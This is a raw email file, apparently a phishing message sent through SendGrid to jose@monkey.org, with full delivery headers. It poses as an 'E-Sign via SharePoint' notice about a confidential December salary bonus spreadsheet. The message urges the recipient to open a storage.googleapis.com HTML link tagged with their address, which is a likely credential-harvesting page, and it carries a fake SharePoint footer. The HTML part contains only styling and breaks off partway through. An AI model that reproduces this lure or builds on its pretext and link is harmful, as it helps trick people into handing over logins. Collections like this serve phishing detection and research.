@@ -1,0 +1,505 @@
+Return-Path: bounces+51326402-30d6-jose=monkey.org@em1924.scpixz.com
+Delivered-To: jose@monkey.org
+X-FDA: 84246821526.40.E8BAF1A
+Received: from vsvhthvx.outbound-mail.sendgrid.net
+ (vsvhthvx.outbound-mail.sendgrid.net [134.128.112.138])
+	by imf18.b.hostedemail.com (Postfix) with ESMTP id 57CC0120004
+	for <jose@monkey.org>; Mon, 22 Dec 2025 11:09:42 +0000 (UTC)
+Authentication-Results: imf18.b.hostedemail.com;
+	dkim=pass header.d=scpixz.com header.s=s1 header.b=uBbwKT4r;
+	spf=pass (imf18.b.hostedemail.com: domain of
+ "bounces+51326402-30d6-jose=monkey.org@em1924.scpixz.com" designates
+ 134.128.112.138 as permitted sender)
+ smtp.mailfrom="bounces+51326402-30d6-jose=monkey.org@em1924.scpixz.com";
+	dmarc=pass (policy=none) header.from=scpixz.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1766401782;
+	h=from:from:sender:reply-to:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:list-unsubscribe:dkim-signature;
+	bh=nTfmIMMJ6Hw2Yf+uZo0+KHSJIX0jlLfEd9qZ/pg593o=;
+	b=4sK69Y6rVoSz+mP/xWXvvfDhKOgMDr6iZ4kbVbRs4o/qopt79qoeGV4qQ3tiP5t8PEpM+p
+	mZl73dsgieSKwryAg9Tde4dG/whyk2BYzoL+D7u1RuWIddK8MUm+gltUvxbQcEQQmmILuk
+	taZOJsrVb0Ro6mFtmB56myjbf9GfU/w=
+ARC-Authentication-Results: i=1;
+	imf18.b.hostedemail.com;
+	dkim=pass header.d=scpixz.com header.s=s1 header.b=uBbwKT4r;
+	spf=pass (imf18.b.hostedemail.com: domain of
+ "bounces+51326402-30d6-jose=monkey.org@em1924.scpixz.com" designates
+ 134.128.112.138 as permitted sender)
+ smtp.mailfrom="bounces+51326402-30d6-jose=monkey.org@em1924.scpixz.com";
+	dmarc=pass (policy=none) header.from=scpixz.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1766401782; a=rsa-sha256;
+	cv=none;
+	b=1yAsit+CA5BwVJbvbDimZOCC4Sa5nuzQ+fHs7aZ0XfxiGmsfPOs+EvHzQpJcSLXFksRtHt
+	p1hpbxVjDAyEbXzeVANwawMouWzFHkLdsM3ZKmGz70UMe/PFZkRCKMOx1bvWUeNgVAe6u6
+	f3Bu2jW1T551u6JfoFtv10KRnD6jhco=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=scpixz.com;
+	h=content-type:date:from:mime-version:subject:reply-to:to:
+	list-unsubscribe:list-unsubscribe-post:cc:content-type:date:from:subject:to;
+	s=s1; bh=nTfmIMMJ6Hw2Yf+uZo0+KHSJIX0jlLfEd9qZ/pg593o=;
+	b=uBbwKT4rzPL0xrCm/V60h47l9LohyuSiNs1hMYGYADd5WbweXj35ayXP/DQqzH/JGWQo
+	tmjnJvCVjsZnRfu1FMb6osXRl/FPUhG4bcUJ3t5f3X8LMNBSyJvVWyl3V4KWLylGQlCU9b
+	jdBR5S8afgV5t2BCQp4oeNpDAPkf/GD5NH1TBG0WFdA2RR8JAvmxLsVfaO6IkGCZki/9fO
+	yMAlMpojVcqtWIhuDqUxrzkJDxdPgzj6XWUCybHUBs6mCbg+m32EG7ZScIUKMpd7KyMBUZ
+	YibCzUn0IIxnHAgLiTK0yVST45T4JrvewcIxBewvMIGRE6/R+tv3qTq0DPSxjedg==
+Received: by recvd-8b7688b-xhlbt with SMTP id
+ recvd-8b7688b-xhlbt-1-69492236-31
+	2025-12-22 10:49:26.771272127 +0000 UTC m=+389866.840730981
+Received: from NTEzMjY0MDI (unknown)
+	by geopod-ismtpd-24 (SG) with HTTP
+	id VxonJEkQTcCQA575P1wt8w
+	Mon, 22 Dec 2025 10:49:26.758 +0000 (UTC)
+Content-Type: multipart/alternative;
+ boundary=296534cb5c338c48272f12eade72b5133d13d33e0272c97e485cf4e806df
+Date: Mon, 22 Dec 2025 10:49:27 +0000 (UTC)
+From: E-Sign via SharePoint <n0r3ply@scpixz.com>
+Mime-Version: 1.0
+Message-ID: <VxonJEkQTcCQA575P1wt8w@geopod-ismtpd-24>
+Subject: Action Required: December salary bonus for jose@monkey.org
+Reply-To: n0r3ply@scpixz.com
+X-SG-EID: 
+ =?us-ascii?Q?u001=2EOgGo8o8GuGKxYIkkUbXZr+SttwKaBImR6Ldn7oVGXqv6iF38kdroNlH2Y?=
+ =?us-ascii?Q?BuLiSGN+vYtNoTJxVSdukIY8k4KIqVOmAF7XWza?=
+ =?us-ascii?Q?FHf5AJKYFEx2MEZc5q0xCt1kVKuVyCwAESXRlm=2F?=
+ =?us-ascii?Q?VYF+hmVKF0b4cMQid=2FkI3hRE74+CYEqFZ0gt8aE?=
+ =?us-ascii?Q?HwkIn2K8hAhW46Y75P0cGC0OeLgzXW3+K+zMLsb?=
+ =?us-ascii?Q?IfoBl1kyhC0d3xnB+ippWmw=2FobNx85g7yOvW3rQ?= =?us-ascii?Q?oDwl?=
+X-SG-ID: 
+ =?us-ascii?Q?u001=2EXwhBPNhCejkv4+fVosb2QVfR16Qxp9CrA7PjDe5zzeI=2F0IZCBsPXtgHbA?=
+ =?us-ascii?Q?oGIj+RskLxA4N2rJjSWrHfgX07tLOm0v5BUQcd6?=
+ =?us-ascii?Q?w3knjorGi7Hwu0WCOA5AFSvy0=2FwlG32=2FmhOX2oR?=
+ =?us-ascii?Q?j+KqJmyAbrHzlzprdHDJPFc+E0g5ZErkVDnEdAm?=
+ =?us-ascii?Q?KOL45Iqc98jXwF=2FDxc7dnH4oZbrgFqhmXdVoVeL?=
+ =?us-ascii?Q?LBZliFjpHyMAF3g5G9=2FTkCXEUK0N2Riv42ideMF?=
+ =?us-ascii?Q?AtftHabTdasj3Z7lxg2LWvN3C6+83ap4nz9JCIp?=
+ =?us-ascii?Q?0xrOW9cWsuG+AXi2eUkEvz6nbAx6RyfgRHTni8d?=
+ =?us-ascii?Q?3Cj6Rs5VTjBV9NGs=2FyUIZIRvLfY3kFoffm3Acvz?=
+ =?us-ascii?Q?owFwNHSdXGfgG1XiNOlMXYqgSvTJejUWnuwxDRu?=
+ =?us-ascii?Q?Uv8DuZRJlBzD2xrad76LnSy65L1sxlP6LUvslet?=
+ =?us-ascii?Q?SosyU0gfB365oVAtDrpf19msCSroirDhBAmuntM?=
+ =?us-ascii?Q?qtI7u6bCnVKpRNGCfmwMe3dPDcPb5LUfnUfG4Z0?=
+ =?us-ascii?Q?As7ZyzeWTES36CV=2FocklaTNCrDXuoPxL2mGJFtc?=
+ =?us-ascii?Q?XlPQZBL1XuymOxPFnNFDnm5H=2F2IgNgfMufHgu+C?=
+ =?us-ascii?Q?ZzWMM3qcbVwm8hoXZ1zujcby7487dWDWNZDfBlN?=
+ =?us-ascii?Q?tSh+UGC8ZvzN3eYVhR7=2F+aIqgWz6u51l26itECU?=
+ =?us-ascii?Q?Vh39nY9ac3sdMessSyd9iL7U0XXyaIjmRyMCWxt?=
+ =?us-ascii?Q?SNnUWmr9YK2S=2FYvAFxz4tpYFNkkvgpl1yMb6cZ+?=
+ =?us-ascii?Q?R+B6aVH2=2FugjtPFBaRyWs3ZdYOf8tHA=3D=3D?=
+To: jose@monkey.org
+X-Entity-ID: u001.kpYvyHboLMwIxUR537nBQw==
+List-Unsubscribe: 
+ =?us-ascii?Q?=3Chttps=3A=2F=2Fu51326402=2Ect=2Esendgrid=2Enet=2Flu=2Funsubscribe=3Foc=3Du001=2E6=5F9u?=
+ =?us-ascii?Q?LfGk58Q2N70Se-WtJhEB6UBR-nVv549ML1XSFKP?=
+ =?us-ascii?Q?cNzCw0ppBeiQi9kgOQ30ejloCGihwRpIDg8ViO5?=
+ =?us-ascii?Q?XEkMhZfNslD4bxFK1PVxgAg6VKTxp0wkoSWtDj=5F?=
+ =?us-ascii?Q?5dpkLbb6we8nvHhn-2UQmX4nLfS=5FpW4gT06hTsk?=
+ =?us-ascii?Q?JmabKXOTqnFEyD-uR7MmNqLTfm1Ws7YE=5FOeW6CI?=
+ =?us-ascii?Q?ZZbfCoo7PEdaNtMkAVsg1XPoQVts7N9RV2u-VIJ?=
+ =?us-ascii?Q?AjpCEMdF29QqvPu1bIibSwuzV0771yhMw=5FzsFVY?=
+ =?us-ascii?Q?jVW2L5Hq5fLITXwgISugxVYjcC70Nly9TmrA98i?=
+ =?us-ascii?Q?uR3L=5FjZRIXOuth=5F6PnPsHZFZcdtpllFAOxxJVnb?=
+ =?us-ascii?Q?PbAYjGT--ds5gYIEcrKQA7n7st-TIiyRAo9bb9f?=
+ =?us-ascii?Q?BXML=5FOiTMm5AoK1f3uiliYwYfgegOZEalRMqmM=5F?=
+ =?us-ascii?Q?MrHs0RplVtwZSyWpMuqbDNY3O4zo5kPFYnf3MQ7?=
+ =?us-ascii?Q?sPzjMDnMQiOgVwcrEsUqWZ6vXUB80DQp7RyaRB8?=
+ =?us-ascii?Q?ccoEr6qUDIY3TV2tSKqMtb=5FRyGHkfS9hoCBOTcA?=
+ =?us-ascii?Q?bBxhpx=5F6k86reqSEAfxhgrXeRNxe5EdzYOLVzJV?=
+ =?us-ascii?Q?xHcxkgl79tUtnRUZHpfU1=5FdNL4ZuFz-B2cfEFCr?=
+ =?us-ascii?Q?HpGgHX438bKkx3hHHY7JJs=5Fpq8VJ=5FTG3pf6rIid?=
+ =?us-ascii?Q?u3Ly7jd6dL8kD1LWEWZoRPifUV7VcEkhECrCQnQ?=
+ =?us-ascii?Q?t-5HeqIfPFKv10R5ngwBEPrjjpbWwefaWpUVMT0?=
+ =?us-ascii?Q?YKQ1O-pvYUcb4sLwAD85NGTpXKbi6BOT7qeDdG7?=
+ =?us-ascii?Q?cXpazu1oWdZYqXpkdwtAmxXBtXlEOVFA8VnwyO0?=
+ =?us-ascii?Q?XKUyHXAmWKzFQfn7ZSNewV0zTdQGOB6uqnmNO2l?=
+ =?us-ascii?Q?U4iv1BMcsjdObGcYZCrAKbuSaiBP0PtFxunPUfx?=
+ =?us-ascii?Q?Z9sSLlEAaO0JymaJvuYm7s--f=5FaTLSdnXE4fWyC?=
+ =?us-ascii?Q?cpLfHvISg8oZhE8OcdbFyLU1FcYti4zLdITSmou?=
+ =?us-ascii?Q?C1viIvoa=5Fg1FfKfLlnaNFVL4CiesZYt=5F8LneE65?=
+ =?us-ascii?Q?URixyd21xKsC8R2qaJhBDGYm3hotDKFrlcwWHXw?=
+ =?us-ascii?Q?YKVVtRoX0KZxw9Vn-BJaNtf2zXxJztj2nBBrvIm?=
+ =?us-ascii?Q?M0ke-Ouf312PuhgXd3JOuVGbQsR6lVbRJIZNGrZ?=
+ =?us-ascii?Q?dSFr9=5FHyL-cFJQMeTr5LhIYoouZ=5FEgNAIOoCLr-?=
+ =?us-ascii?Q?pbqtx4uYYI3ZPhaP3lZvvKKFaRY76A4KDimuk6F?=
+ =?us-ascii?Q?12PJ7IemqKKRIPLmsGrlI-uCX0EWJCHppYWBX51?=
+ =?us-ascii?Q?hrqTbwtA5vTGtT9Y8vpQ2fhUmnflEzmOUCTBTY5?=
+ =?us-ascii?Q?Ft4hIqWA0dbPMCr2ilKLyWcTzX22rZNZLAxgHsC?=
+ =?us-ascii?Q?G5VxZ60OfqEoD0u16gPNKUl8=5FeZqtyqV1ww1Q4-?=
+ =?us-ascii?Q?iYkWdSCpVrHDFZMukg0wFd1DmChjkiCqQvZJ3CJ?=
+ =?us-ascii?Q?eu0cw3-0MC9xCjRbzApyjvew3416xHfUYfv-oKb?=
+ =?us-ascii?Q?ObvFpWipstHJ1LKm9HhNWWlAUDqQmjH2SsM-2HP?=
+ =?us-ascii?Q?VsKXQmIiI=5FqE8LqaRZ-ur7j3q9dW9TzScUcvWtr?=
+ =?us-ascii?Q?D73Onf=5F9PJEiivp7vuFhXYmFpoEOuXieXHqhrMp?=
+ =?us-ascii?Q?5YkNayoEpn9BJO9v0p84OhtTC9R=5F9CWMde0PKI0?=
+ =?us-ascii?Q?8KbDE4osy2aLZbpcVIGtWGPe-A3VZJypAmgkft0?=
+ =?us-ascii?Q?i4eNMa0zrbo5Ff5xMYyVpTcbva-IgRsltIBlJC6?=
+ =?us-ascii?Q?endgA=3E=2C=3Cmailto=3Aunsubscribe=40em1924=2Escpix?=
+ =?us-ascii?Q?z=2Ecom=3Fsubject=3D51326402=2EEQVVe69vOhQLHR64?=
+ =?us-ascii?Q?fu5fFjuPUK1-BF4wJ2-y7dMxbttoMDAwdTAwMGL?=
+ =?us-ascii?Q?PZR-IgOG4tR=5FDyk1MuURdAg=5F0ZVlY9Ehp2WzU-0?=
+ =?us-ascii?Q?IjzJRbeCzcga0cmAaiD-1XMHqcualVCYwYJtEl6?=
+ =?us-ascii?Q?RYZtI7afHO=5FhluZdRq903IE6ZOJ=2EJAaUUTYTJrQ?=
+ =?us-ascii?Q?NJoJgCgZAsb31ta733xgslvfEMHjuEYhoMDAwdT?=
+ =?us-ascii?Q?AwMMMgRBZ9b6gLNf-pseS3J4ktz881WQx2SCd2Y?=
+ =?us-ascii?Q?TQmOfHpX5UlwKNQmHk7yIRtzzlHhKCLJqRgMgW4?=
+ =?us-ascii?Q?FPzX5EFSA=5FB01qauZM-RIrKLeJkHOxNJhLsd88l?=
+ =?us-ascii?Q?hCP4ct0jeOS-LzdXtza1AxwvIL4J=5FEZsGBJuWcO?=
+ =?us-ascii?Q?qRvRWMbAD4uLuo4MzXA5DUScH3ypZT8-QtHdg4S?=
+ =?us-ascii?Q?hJVYEaowEtbiUIOFfOZLAfHWGUGIUJ5yLyo14o9?=
+ =?us-ascii?Q?JjPDXz9mh24K-3D8PSbPK7ilAo=5FBa7qa8LmP7U3?=
+ =?us-ascii?Q?Bkw1t3hhhRaM41h9HxvLSObcWIilh0E0S3rjfof?=
+ =?us-ascii?Q?6znkr8g78dBgr=5FAlTwVZSb-q96a9ABKiIrBVo8X?=
+ =?us-ascii?Q?=5FoL6SH3WgBoTXICZ8sTyxVsTWjBAZlC9Q0V38wx?=
+ =?us-ascii?Q?iWX7St9=5FdBMy226mrY=5FF6Z289sDutoGRp74XiCi?=
+ =?us-ascii?Q?JoW69TfwKA4J43AA=5FCrJM3sIDO5o5F4xjjZLY=5FL?=
+ =?us-ascii?Q?K218jog9jaIjKDLOBYMF5BjY67u6f4wu=5Far3AeU?=
+ =?us-ascii?Q?jSf5NyoWdJKN=5F46ue65a5fi9OR9fsavBy2esXNv?=
+ =?us-ascii?Q?FujLfOKbAGb3CBS=5FcjfJorbLrILO8i-wrtYctQq?=
+ =?us-ascii?Q?37sBO1H0SZIg53Qle--mUO9KVze59k=5FtYIJZ60R?=
+ =?us-ascii?Q?Bvbc1DKum3gxqC9Q55IKjUVSa56KEEr9rL1fkHq?=
+ =?us-ascii?Q?BrSNo-14skxBxEekyOZFBCBPANQiXKhvK6Wq0-c?=
+ =?us-ascii?Q?wjXESYHF9ToaCMJiuy6xYOV1rhn3a9xK7rhKHM5?=
+ =?us-ascii?Q?hxF6PRAXLNSjRoXC2u75P-Vc4ma1KiAxb6XBIjC?=
+ =?us-ascii?Q?wpz7DU0XCTPiLJ9P9bRFB7F2j4DZ=5FONP1rc3V9W?=
+ =?us-ascii?Q?OaskcoSpbxfvl-hEHTGeSiycmU2v=5FsXjoh4oqzS?=
+ =?us-ascii?Q?KuGLUysoyswZzQNU0kCrOwP6NSIcBrWSFzDfHAc?=
+ =?us-ascii?Q?nKsiGsu=5FnaIrpc6xZmw5hKC3=5F9pK00E0ug3Quym?=
+ =?us-ascii?Q?-Vhy5oyGd1b=5FsiO7wlCZ6UvmIUWhS20YW3VMXi-?=
+ =?us-ascii?Q?DE8kznZcqE=3D=3E?=
+List-Unsubscribe-Post: List-Unsubscribe=One-Click
+X-Rspam-User: 
+X-Rspamd-Server: rspam05
+X-Rspamd-Queue-Id: 57CC0120004
+X-Stat-Signature: opa5eq9fk8g41etkq3kfyirgwbxks1hc
+X-Spam-Status: No, score=1.59
+X-HE-Tag: 1766401782-979059
+X-HE-Meta: 
+ U2FsdGVkX1/yOMgBuN/G/amxMav5jf+7+kurOi1xpnqjrjXHiz1qVBs++8cp1mb0BurHJVebcRPfWBXLIBmjWvAvefRhGDlHuASm2EO83+Jlnn8UlWz72l0HIFm+nKrA4YUQazZOmPQJZ2VQARhr+A/P60VKcuq3b4H1dLyCEeoxpEXeO+YmBglf2+k1yhMs0Y+yaNiCD7bNnGp0G/9X/1jt8fy3Yvy9WpcIFRy+SSJ55BQWecJcKVlxigmQoYW+yjiep0Ezsmc9aeFeATadPGtpNTiWGZX2x5xPMLnU4s9JPauKR+UMaCkxXqjtjcaiJnY9ZjDPbVnzzDW0HVrgYVpTKobkJbOhG9RA3bzutDsbuLZXjTv78XjVlccKMXmQ0kylZCu5pipzaHGGi65u5CBffoSSUrI31/LQBPPSI1x08KDKlK5wW27apg84d201mnJ/Q7nuB1ffgu4+6YGl++xL722TGrzVVMI6L7G2ejYzaKt7VwOwVHCAlFrxkxhkw7alq1xXJIBMZx7yNQC/dqFdd/cr3Gh+7aR3aeA0+T+NfrxEQsoGG9DoW0Z0fZrOhAUq6awrANq35RQeizvw6P8528Wq3ElkXawenwdJDPyw+wMB/tScOzYY4nTPCknTgHQq6nLGB5x3+D4Z1+/e2HqcLQctIExYrc1w6IDLE18Fse9dtz5RK9Ryv1FQniXSr2wXWxjLjiVFHxI4HWH8NvDGU2mx0yQhal09K5KzwEhEWVZ8h9RCz+spVy7pCKEZUfaPkXgGrAXF8oJtipXKZ/wPt799J1SQ/NtAWw4QrLcP1+qxSDOkRoEJb4NdCin3PwkWuJD3xJA/mXY/4FT/xZOjJMdPX55fC33n+BiBo8t4K2VWirfXratfICEYJsIg7WQ1Lpj5HI0HBijholBDTlc4mCNj2xSnA44+V2P088HrvuH5I5JUV6jkZmQq573foaEgRo8G9uqUFKRa7un8Mj41F9h
+ Djlpm18RJz8yNOBKU85K6tz2Wh4ebn8iZKzC0VX4Y+IueC9kvwmHE6hiZIWxNzsXg/D9IkjpbUnZuaGRLWwDTANIyjEASZTe1wcATGqt2lojQZWckIfSvgP97gubXjMcdzWBfAyHHb4MO+ewD33SAZpWfr4rm+ugS7FuXv7iDWvAw7UFd4ro1cAL81UvFktnm2pq6gjN4ZPk8b6j2Fzhb9lxvbkoV+euJaC5U7GQn2YIdSNHRa9nN+C0oS1pqfK3UvAZXyUxdNytLtc5WHQud8YM92nhxlDka6+Vk5yCdWaxEz9DZr/CMga3Qfshk7vUyERo6A4CA5k3BoScrPmWm/NXcqGKrQbxRGxQcGbCQF7U5ZFgwHy2WjMnUIflaiKbgJF2nQ6c1kBP1WWTX4qfksS5uLzTXBngE0VrT9XtokwADiZJfPnhnLtGZJM7Oih9Qx3dDPVB8rSjbU7qkU98fAcCz0epdMKTtZSjFq7sJ0mshOexCWFoc9wkr1OA1kALRCQcxWgPJkiTOF8NViWsj+YufEUGQ7s2oBuBd76hQqn9AOXv6y63sXDnOz14kXlFAmhc26VVjH+YqZhzT+n3rD/Fndh+liHR+rC5oyUa1GjgdC/oEtVWe0XJK6KITga8Q6qOn2FcD9Axokt4nQ2urErEsTQl78rqbF/LDV5C/KEQO1uT+9pLRxrgjQeIJqLqTbzTp2PdbAY1giRZ4MC0DNqqGktmaaKsTZSOvQUO/EudvnMUK5gvp1fBVLQ==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 477
+
+--296534cb5c338c48272f12eade72b5133d13d33e0272c97e485cf4e806df
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain; charset=utf-8
+Mime-Version: 1.0
+
+*Document:* *December* *salary bonus=C2=A0spreadsheet.docx*
+
+*Employee:* jose@monkey.org
+
+*Date:* 11 :21am, December 22, 2025.
+
+*Security:* =E2=9C=93 Encrypted & Secure
+
+Attached *December 2025 salary bonus spreadsheet* is available for review.
+
+Preview=C2=A0& Save for your common reference.
+
+*December 2025* *salary bonus=C2=A0spreadsheet.docx*
+
+( https://storage.googleapis.com/54fc8e2b5059b03340cd04f0x816754fc8e6754fc8=
+e2b5059b0/book-bloke-broken-bald-black-beettle-bethel.html#jose@monkey.org =
+)
+
+*CONFIDENTIAL:* Contains sensitive salary information.Please do not share.
+
+=C2=A9 2025 SharePoint Inc.
+221 Main Street, Suite 1550
+San Francisco, CA 94105
+
+Unsubscribe ( https://u51326402.ct.sendgrid.net/asm/unsubscribe/?user_id=3D=
+51326402&data=3DbBbe_V89bPNH3bx2-x1YX7MPUlwV-CBWb8dAWtl_yDBoMDAwdTAwMIBtXuG=
+c2xPAxdhUQhfk0MlTh_HYFj1ihZ0JpKmjM0w9KhWdky70ANqWO-sYjmCOXuprG0NKRGvypk-n5Y=
+Em-Bh3jJ_cuX2AanpHGn5D2Sn8_CFScke1xHBW_pZm9cH47GMstYEE_mCDlAHm5YGsGbvWLG_Mz=
+5ur9LuZx5fbcQk6DahzqCzwLaaL_OzjhZaLTWhvYASUF6THpDTmrSuWtrx2DzDjef1hp7ENRjxn=
+H8ysm1akrK0p31H8ayg_X76wAyQjoIyy9lIhmMaVLv2ZiPA-h6lsB14LlVuCH_5vgt5dz3FgQ64=
+fRCjTQ2_5uLHAmgABYJtuSnMlkx3Ya1pR0PkQoumaHKoCxQyD8HkpB5DB3pzC1NF9S8Xf_oILUh=
+j32mOQSANCREiJb6BtYCZO0flI1u9fRgZ1T6ico2ldCt8j8vqz7e7K5zPC_pGwoAQixLeQXNYbr=
+vAFSjEuETzSHzCyNHEwkoAnuyc1BTUjna6BVrS0K71z9iJshe4r2xPZGO9QLxSNeFM8uuV4Z8RW=
+BDuOnduksg21H0zxytarPpsmATYsdkg2SYJ4ATJrYHpgaTq9LVJemd_CxbAWB9T9hstiXR_akgK=
+KGbUuiuILNWrBEZQszDO8iZD-Rdp52wMKJ2pMhA30s5RxVV45JSTiQY0eGWuG5G-mzGR_Wfq581=
+mM6hu6vQeRWAnfibR4lzO9aCfsr6L5UaFuJbeUCFRVviBdR_P8mYi5sNZ-wRbuaDWelLy4pnrwC=
+LEWE11-UO2zvxKlpI-2q3EGP0KY37RLchyOl5oK6s25TFqXP0zN3GED3ZvQ7rfPo5mTdwDVjZwk=
+C2ww_rk0mmzpVIoxUOW8iVHa2jLrqr7oFvZtRRyDUyWk8sriAV4WF4odnXHJPiX2S8DnkcJIQo3=
+OoGzo3FLkacXa8EV2_-Yzx-SoAINhdAnDgn5YnuCsAYC6GCTGywCrWfrKzT1lWCTiXHeHx0B_Tx=
+Vi1iI6fUPwbnY3ozuA4FCDQN3S1EA7KdZKp_Ch9yks9Hce5hDlR-8dz2VBsT0NdDP44jLL9yPlO=
+_BP586ECBAn_FbforRA2eUwmZ-kIEYBUdSPwwTiMnyOwL4-g8I38pMFdXDF7twS7WBD7GrFTxNI=
+ ) - Unsubscribe Preferences ( https://u51326402.ct.sendgrid.net/asm/?user_=
+id=3D51326402&data=3DRUF1WL8aXuOAkZtMBUr6InV7FJILkBINYJDbJJqZVPtoMDAwdTAwMP=
+hF0b0be0HEOWCO7Bo_-MqUrx_nzrE_eAsTwxiOl76IPPq7lVDT07_vATVgMveCewMU5katWKWLZ=
+PoAfaRlfK0Q1sHDnRp-Gvph3hXy1SSZKjovlaFH8TzElGOkD-T53Am99vb-W00QcISENfmR11Pk=
+mbmuWhTY1EX2CpfxSSzvLjOqBwRnBEAZ6t0obWhbwtNiOPyzdnPdHKjUBsFGeEdUQ9VVqzEZzl6=
+qUOVabku_zqlunRZCz8mW_BxCOjkYfx3BNm958KXR1SCtXrv0PgJBJgl3z5pDHxqXo6lotTcr_m=
+ZOChMQSgz8tlWZh3qW0CFa-bMomOG5X24bU9vVsbOJ2AROmLC2ZLL4W7Fd8-rR48RIaW2Qm9ZRm=
+RI8DL8b7Z4DOsOUi68SQaCioH1odbCjTV1eB5iObjY0HY_GaBaAlIWyb1OlG8fW9SUPBnmNY0_U=
+xgcNXeq3brlLcM-Y2jAm-8QgbT6e7zhs2UVLw7RmrFqsrwNjVE5O6OQzl9mu6iHSPlBANHS_Rzq=
+nY0WJxuFvJTLV6M3N1-M1cvnJ9mLE8_daxsu_nV7jbRKV8H84UCeu-hUIkLIFoiBQImkCG45-C5=
+c-2FVoEUv6wACp9NlXAYKlvS1K_BbdqebcOZvtj-IGuci1wRQMNtfIodOTiC6wCj0lLuYU_KOWP=
+fG0Jb6VVm1xDTOgV_bqonTfxvMNEtkNS4CaR7E-z5KY1D_XNmAiuYwnZSgu9asuKn6wDMbIlOey=
+GIgqQNVd4K4mQf8yXrbASprbpIu4yo2pBu3FGKYsc6fverBv4j8t9bBsdXMuRuqyxbGYjjV97kp=
+IAEzm3NRBLNvKDgNOGnJpCeBR3pLHi9RMe3WOt3ZzVQhYMQOQ-7_0W_lxEAR2S_IYr7aoVxhBxC=
+_XCVkTbU_FmPOu8gyyXCYBncS7PcK25NNP9hIvjsxDIJwxmqHLO_StOlaP_HwU2xSHrPBvwrnp2=
+36-ERTLg4v-8czDn-jgT3JCKqajSJdJ3h34s5xu8LzgvE195G2Fp4l369GXn40ZhrxRrQHZrTma=
+-MBWJAQoe8ml9f6WYHDnE3JChh1uAObz_Rxf__Y5uyS_xaI8qh7Yz2CU70Xe0hEz1S6dxe4TDg5=
+f2vuX )
+--296534cb5c338c48272f12eade72b5133d13d33e0272c97e485cf4e806df
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html; charset=us-ascii
+Mime-Version: 1.0
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<DIV id=3Dmessage-header style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; =
+FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TE=
+XT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(197,209,211); FONT-STYLE: =
+normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BA=
+CKGROUND-COLOR: rgb(33,41,44); TEXT-INDENT: 0px; font-variant-ligatures: no=
+rmal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decor=
+ation-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial">
+<DIV class=3Dheader style=3D"BOX-SIZING: border-box; DISPLAY: flex">
+<DIV class=3D"header-content details-view" style=3D"BOX-SIZING: border-box;=
+ flex: 1 1 0%">
+<DIV class=3Dheader-links style=3D"BOX-SIZING: border-box"><SPAN></SPAN>&nb=
+sp;</DIV></DIV></DIV></DIV>
+<DIV id=3Dmessage-content style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px;=
+ FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; T=
+EXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(197,209,211); FONT-STYLE:=
+ normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; B=
+ACKGROUND-COLOR: rgb(33,41,44); TEXT-INDENT: 0px; font-variant-ligatures: n=
+ormal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-deco=
+ration-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial">
+<DIV role=3Dregion class=3Dleftcol style=3D"BOX-SIZING: border-box" aria-la=
+belledby=3Daria-label-messageattachments></DIV>
+<DIV role=3Dregion class=3Drightcol style=3D"BOX-SIZING: border-box" aria-l=
+abelledby=3Daria-label-messagebody>
+<DIV id=3Dmessage-objects style=3D"BOX-SIZING: border-box"></DIV>
+<DIV id=3Dmessagebody style=3D"BOX-SIZING: border-box">
+<DIV id=3Dmessage-htmlpart1 class=3Dmessage-htmlpart style=3D"BOX-SIZING: b=
+order-box; BORDER-TOP-COLOR: rgb(77,96,102); POSITION: relative; BORDER-LEF=
+T-COLOR: rgb(77,96,102); COLOR: rgb(44,54,58); PADDING-BOTTOM: 0px; BORDER-=
+BOTTOM-COLOR: rgb(77,96,102); PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-R=
+IGHT-COLOR: rgb(77,96,102); PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,2=
+55,255)">
+<DIV id=3Dmessage-htmlpart1 class=3DrcmBody style=3D"BOX-SIZING: border-box=
+; FONT-SIZE: 14px; FONT-FAMILY: arial, helvetica, sans-serif; COLOR: rgb(0,=
+0,0); MARGIN: 0px auto">
+<TABLE style=3D'BOX-SIZING: border-box; FONT-SIZE: 15px; OVERFLOW: hidden; =
+MAX-WIDTH: 640px; BORDER-TOP: rgb(200,200,200) 1px solid; HEIGHT: 778px; FO=
+NT-FAMILY: "Segoe UI", "Segoe WP", "Segoe UI WPC", Tahoma, Arial, sans-seri=
+f; BORDER-RIGHT: rgb(200,200,200) 1px solid; WIDTH: 640px; WHITE-SPACE: nor=
+mal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(200,2=
+00,200) 1px solid; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33,33=
+,33); FONT-STYLE: normal; BORDER-LEFT:=20
+rgb(200,200,200) 1px solid; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px auto; LETTER=
+-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; fon=
+t-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke=
+-width: 0px; text-decoration-style: initial; text-decoration-color: initial=
+' cellSpacing=3D0 cellPadding=3D0 border=3D0>
